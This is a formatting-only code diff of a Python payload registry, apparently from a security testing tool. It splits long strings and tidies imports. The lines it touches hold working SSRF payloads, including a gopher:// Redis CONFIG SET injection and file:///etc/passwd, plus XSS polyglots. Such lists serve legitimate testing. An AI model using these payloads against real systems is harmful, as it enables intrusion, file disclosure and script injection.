@@ -12,7 +12,8 @@
 # See the License for the specific language governing permissions and
 # limitations under the License.
 
-from typing import List, Dict
+from typing import List
+
 
 class PayloadIntelligence:
     """Consolidated registry of high-impact security payloads."""
@@ -37,7 +38,10 @@ class PayloadIntelligence:
         "http://10.0.0.1:22",
         "file:///etc/passwd",
         "dict://127.0.0.1:6379/",
-        "gopher://127.0.0.1:6379/_*1%0d%0a$7%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$3%0d%0adir%0d%0a$4%0d%0a/tmp/%0d%0a"
+        (
+            "gopher://127.0.0.1:6379/_*1%0d%0a$7%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$3%0d%0adir"
+            "%0d%0a$4%0d%0a/tmp/%0d%0a"
+        )
     ]
 
     SSTI_PAYLOADS = [
@@ -63,7 +67,10 @@ class PayloadIntelligence:
     def get_xss_polyglots() -> List[str]:
         """Polyglot payloads that work in multiple contexts."""
         return [
-            "jaVasCript:/*-/*`/*\\\"/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()>\\x3e",
+            (
+                "jaVasCript:/*-/*`/*\\\"/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//"
+                "</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()>\\x3e"
+            ),
             "'\"><svg/onload=alert(1)>",
             "javascript:alert(1)//"
         ]
